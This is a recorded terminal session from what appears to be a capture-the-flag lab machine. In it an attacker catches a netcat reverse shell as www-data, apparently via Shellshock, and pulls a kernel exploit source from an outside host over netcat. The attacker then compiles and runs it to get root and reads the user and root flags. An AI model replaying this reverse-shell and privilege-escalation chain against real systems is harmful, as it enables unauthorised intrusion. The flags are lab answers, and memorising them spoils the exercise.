@@ -1,0 +1,137 @@
+Script started on 2025-01-27 22:06:14+03:00 [COMMAND="nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+listening on [any] 6047 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 1263
+bash: cannot set terminal process group (838): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls
+ls
+ryan
+www-data@ubuntu:/home$ cd ryan
+cd ryan
+www-data@ubuntu:/home/ryan$ ls
+ls
+user.txt
+www-data@ubuntu:/home/ryan$ cat user.txt
+cat user.txt
+THM{Sh3llSh0ck_r0ckz}
+www-data@ubuntu:/home/ryan$ cat /etc/*-release
+cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+www-data@ubuntu:/home/ryan$ which gcc
+which gcc
+/usr/bin/gcc
+www-data@ubuntu:/home/ryan$ gcc --version
+gcc --version
+gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
+Copyright (C) 2013 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+www-data@ubuntu:/home/ryan$ ls
+ls
+user.txt
+www-data@ubuntu:/home/ryan$ touch test
+touch test
+touch: cannot touch 'test': Permission denied
+www-data@ubuntu:/home/ryan$ cd /y tmp
+cd /tmp
+www-data@ubuntu:/tmp$ ls
+ls
+www-data@ubuntu:/tmp$ nc -    whjich      ich nc
+which nc
+/bin/nc
+www-data@ubuntu:/tmp$ nc -lvp 9999 > exploit.c
+nc -lvp 9999 > exploit.c
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from [10.9.2.115] port 9999 [tcp/*] accepted (family 2, sport 11044)
+www-data@ubuntu:/tmp$ ls
+ls
+exploit.c
+www-data@ubuntu:/tmp$ gcc e	xploit, .c -o exploit
+gcc exploit.c -o exploit
+gcc: error trying to exec 'cc1': execvp: No such file or directory
+www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/u<t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/us                         r/bin:/sbin:/bin
+www-data@ubuntu:/tmp$ gcc exploit.c -o exploit
+gcc exploit.c -o exploit
+www-data@ubuntu:/tmp$ ls
+ls
+exploit
+exploit.c
+www-data@ubuntu:/tmp$ ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+exploit
+exploit.c
+# cd
+# ls
+exploit
+exploit.c
+# cd .root
+sh: 5: cd: can't cd to .root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+THM{g00d_j0b_0day_is_Pleased}
+# cd /home
+# ls
+ryan
+# ls -al
+total 12
+drwxr-xr-x  3 root root 4096 Sep  2  2020 .
+drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
+drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
+# cd ryan
+# ls -al
+total 28
+drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
+drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
+-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
+drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
+-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
+-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
+# cd /root
+# ls -al
+total 20
+drwx------  2 root root 4096 Sep  2  2020 .
+drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx  1 root root    9 Sep  2  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-r--r--  1 root root   30 Sep  2  2020 root.txt
+# exit
+www-data@ubuntu:/tmp$ exit
+exit
+exit
+
+Script done on 2025-01-27 22:23:37+03:00 [COMMAND_EXIT_CODE="0"]
